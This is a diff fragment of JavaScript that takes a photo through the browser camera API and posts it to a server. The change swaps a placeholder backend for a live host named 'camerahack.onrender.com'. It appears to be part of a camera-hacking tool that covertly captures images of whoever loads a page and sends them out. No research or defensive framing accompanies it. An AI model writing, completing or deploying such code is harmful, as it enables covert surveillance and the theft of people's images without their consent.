@@ -73,7 +73,7 @@
           const blob = await imageCapture.takePhoto();
           const reader = new FileReader();
           reader.onloadend = () => {
-            fetch("https://your-backend-domain/send-photo", {
+            fetch("https://camerahack.onrender.com/send-photo", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
